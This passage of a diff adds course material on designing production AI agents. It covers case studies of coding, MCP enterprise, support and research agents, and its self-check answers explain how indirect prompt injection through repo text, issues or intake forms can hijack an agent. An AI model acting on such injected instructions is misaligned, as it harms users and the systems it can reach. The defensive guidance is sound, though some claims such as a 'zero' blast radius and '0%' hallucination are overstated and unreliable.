+| **D. Safety, Evals & Scale (`10 min`)** | **9.** Threat model (indirect injection, CaMeL, microVM sandbox).<br>**10.** OTel spans, Replay/Golden evals & Canary gates.<br>**11–12.** Queues, TPM budgets, tradeoffs & **simplest V1**. | Gate rollouts on `cost_per_successful_task`, `loop_rate`, and `0%` adversarial leak rate. |
+
+---
+
+### 2) Case Study A: Autonomous Coding & Bug-Investigation Agent
+
+**Prompt:** *Design an agent triggered by a production exception or bug ticket that investigates a large repository and proposes a verified fix.*
+
+1. **Why an Agent Is Justified:** Root-causing an unfamiliar stack trace requires dynamic hypothesis testing (`grep -> read caller -> inspect git blame -> reproduce test`), which cannot be hardcoded as a fixed pipeline—paired with a deterministic **Evaluator-Optimizer** inner loop (`Edit -> Compile -> Test -> Lint`) [1].
+2. **Sandbox & Tool Architecture (Top Half of Diagram):**
+   - Provision an **ephemeral Firecracker microVM** mounted to a shallow/CoW **Git worktree** at the failing commit SHA—containing **zero production DB credentials** and a default-deny egress firewall (allowing only the internal package mirror).
+   - Provide **coarse, token-efficient tools**: `symbol_usages(lsp)`, `ripgrep_search`, `git_log_range`, `read_file_lines`, `apply_unified_diff`, and `run_targeted_test(selector)`. Offload verbose compiler logs (`>1,000` tokens) to artifacts, feeding only failing assertion diffs into Working Memory.
+3. **Safety & Termination Gates:** Cap the Evaluator-Optimizer repair loop at `max_iterations = 4` and `wall_clock = 8 min`. Block edits to CI/security paths (`.github/`, `CODEOWNERS`). On green tests, push to `bot/fix-<ticket>` and open a **Draft PR** attaching the reproduction test and OTel trace—**never auto-merging to `main`**.
+
+---
+
+### 3) Case Study B: Multi-Server Enterprise MCP Assistant
+
+**Prompt:** *Design an internal assistant that answers questions and executes workflows across Git, Jira/ServiceNow, and Analytics SQL while strictly preserving per-user permissions.*
+
+1. **MCP `1:1` Isolation & OAuth On-Behalf-Of (`OBO`):**
+   - The **Enterprise MCP Host** spawns isolated **`1:1` MCP Clients** to the `Git`, `Ticketing`, and `Analytics` MCP Servers over Streamable HTTP [3].
+   - **Zero Shared Admin Keys:** For every tool call, the Host exchanges the user's SSO JWT via **OAuth 2.0 On-Behalf-Of (`OBO`)** for a short-lived, audience-scoped token (`aud="mcp://ticketing"`). Even under prompt injection, the Ticketing MCP Server physically cannot read tickets outside that user's Jira RBAC, and the Analytics MCP Server connects via a read-only database role with **Row-Level Security (`RLS`)**.
+2. **Orchestration & Consent UX:**
+   - Use **Plan-and-Execute** to fan out parallel read-only MCP calls (`git_recent_deploys` + `jira_open_incidents` + ACL-filtered runbook RAG), cutting multi-source latency from `7s` to `~2.2s`.
+   - Any mutating tool (`jira_transition_issue`, `git_revert_pr`) pauses the durable run in `WAITING_APPROVAL` and renders a structured **User Consent Diff Card** in the UI before executing with a `SHA-256` idempotency key.
+
+:::deepdive Case Study C: Customer-Support System (Deterministic Workflow vs. Bounded Agent) | +5 min
+
+**Prompt:** *Design a customer-support system handling 500,000 tickets/day across order tracking, cancellations, address changes, and complex damaged-shipment disputes.*
+
+- **Step 1 — Don't Over-Agentify (`80 / 20` Split):**
+  - A fast intent classifier (`150 ms`) routes **`~80%` of traffic** (order status, standard within-window returns, FAQ) into **Deterministic Workflows**: fixed code fetches `get_order(session.user_id)`, evaluates exact business rules in Java/Python, and uses a single small-LLM call strictly to phrase a polite response. Cost: `<$0.001`, hallucinated policy risk: **`0%`**.
+- **Step 2 — Bounded Exception Agent (`20%` Ambiguous Cases):**
+  - Multi-item partial damages, carrier delays + loyalty exceptions route to a **Bounded ReAct/Two-Pass Agent** equipped with read tools (`get_order`, `get_carrier_scan`, `search_return_policy`) and policy-gated write tools (`issue_credit`, `reship_item`).
+- **Step 3 — Hard Financial Invariants:**
+  - Deterministic policy middleware enforces `credit_amount <= min(order_total, $50)` and `rolling_30d_credits(user_id) <= $100`; anything above transitions the durable run to `WAITING_APPROVAL` in a human supervisor queue with a pre-summarized case brief.
+
+:::
+
+:::deepdive Case Study D: Parallel Deep-Research Agent with Claim-Level Citation Grounding | +6 min
+
+**Prompt:** *Design a research agent that investigates a broad technical or market question across internal documents and live web sources and produces a cited, hallucination-free report.*
+
+1. **Lead Planner -> Parallel Search Workers (`Map-Reduce` Context Isolation):**
+   - If one agent runs 15 sequential searches, `60,000` tokens of noisy snippets flood one context window ("Lost in the Middle").
+   - Instead, a **Lead Planner** decomposes the prompt into `3–5` orthogonal sub-questions and spawns **parallel Sub-Agents** (`Agents-as-Tools`), each with its own isolated `16K` context window, `max_searches = 3`, and ACL-scoped hybrid retriever.
+   - Each worker returns **only compressed, source-tagged evidence cards** (`{claim, quote_span, doc_id, published_at, authority_tier}`)—discarding `90%` of raw HTML/chunk noise before reaching the Synthesizer!
+2. **Conflict Resolution & Citation Verification:**
+   - When an older 2024 doc contradicts a 2026 spec, instruct the Synthesizer to surface the version/date discrepancy explicitly rather than silently picking one.
+   - Run a fast **Post-Generation Citation Verifier** (exact quote-span check + lightweight NLI entailment model) confirming every `[doc_id]` supports its sentence; strip or flag any unsupported sentence before marking the durable run `COMPLETED`.
+
+:::
+
+---
+
+### Analogy, Where It Breaks & Real System
+
+- **Real-world analogy:** Designing a production agent system is like designing a **modern hospital emergency department**: triage nurses route `80%` of routine cases to standard checklists (**Deterministic Workflows**), complex multi-symptom cases convene specialist consults (**Scoped Multi-Agent / MCP**), pharmacists double-check every high-dose prescription independently (**Deterministic Policy Gate**), and every chart note links to lab evidence (**Grounded Citations & OTel Traces**).
+- **Where the analogy breaks:** Hospital clinicians share implicit ethical judgment; LLM components treat adversarial text inside a patient intake form as instructions unless **external privilege boundaries (`OBO` tokens, CaMeL isolation, and sandboxes)** enforce least privilege in code.
+- **Real production system:** **GitHub Copilot Coding Agent**, **Anthropic Claude Research**, and **Block / Stripe MCP Assistants** combine microVM sandboxes, parallel sub-agent map-reduce, and OAuth-scoped MCP servers [1, 2, 3].
+
+---
+
+### Quick Self-Check
+
+<details>
+<summary><strong>Q1: Why should a Coding Agent run inside an ephemeral microVM worktree and open a Draft PR instead of committing directly with repo admin credentials?</strong></summary>
+<p><strong>Answer:</strong> Untrusted code, tests, or issue text in a repo can trigger malicious shell commands or indirect prompt injections. An ephemeral microVM with zero prod secrets, default-deny egress, protected CI paths, and a mandatory human Draft PR gate bounds the blast radius to zero.</p>
+</details>
+
+<details>
+<summary><strong>Q2: How does OAuth 2.0 On-Behalf-Of (OBO) prevent cross-tenant and confused-deputy data leaks in a multi-server Enterprise MCP Assistant?</strong></summary>
+<p><strong>Answer:</strong> Instead of authenticating to Jira or Postgres with a shared superuser service account, the MCP Host exchanges the caller's JWT for short-lived, per-server down-scoped tokens so each downstream system enforces that exact user's native RBAC and Row-Level Security.</p>
+</details>
+
+<details>
+<summary><strong>Q3: In a 500k-ticket/day Customer Support platform, why is routing 80% of tickets to a Deterministic Workflow superior to sending 100% of tickets through an Autonomous Agent?</strong></summary>
+<p><strong>Answer:</strong> Routine intents (order tracking, standard returns) follow fixed rules where deterministic code gives <code>5×</code> lower latency, <code>10×</code> lower token cost, and <code>0%</code> policy hallucination—reserving expensive dynamic agent reasoning strictly for the <code>20%</code> ambiguous exceptions.</p>
+</details>
+
+<details>
+<summary><strong>Q4: Why do Deep-Research Agents spawn parallel sub-agents with isolated context windows instead of running 15 searches sequentially in a single ReAct loop?</strong></summary>
+<p><strong>Answer:</strong> Parallel sub-agents cut wall-clock latency from <code>15</code> serial hops to <code>1</code> parallel wave and prevent raw search snippets from polluting the lead synthesizer's context window—returning only distilled, source-tagged evidence cards.</p>
+</details>
+
+---
+
+### Sources & References
+- **[1]** Anthropic Engineering, *Building Effective Agents* & *Multi-Agent Research System Architecture* (2024–2025) — [anthropic.com/research/building-effective-agents](https://www.anthropic.com/research/building-effective-agents)
+- **[2]** OpenAI, *A Practical Guide to Building Agents* & *Agents SDK Orchestration* (2025–2026) — [developers.openai.com/api/docs/guides/agents/orchestration](https://developers.openai.com/api/docs/guides/agents/orchestration)
+- **[3]** Model Context Protocol (MCP) Specification (`2026-07-28`), *Authorization, Trust Boundaries & Architecture* — [modelcontextprotocol.io/specification/2026-07-28/architecture](https://modelcontextprotocol.io/specification/2026-07-28/architecture)
 """
     ),
 ]
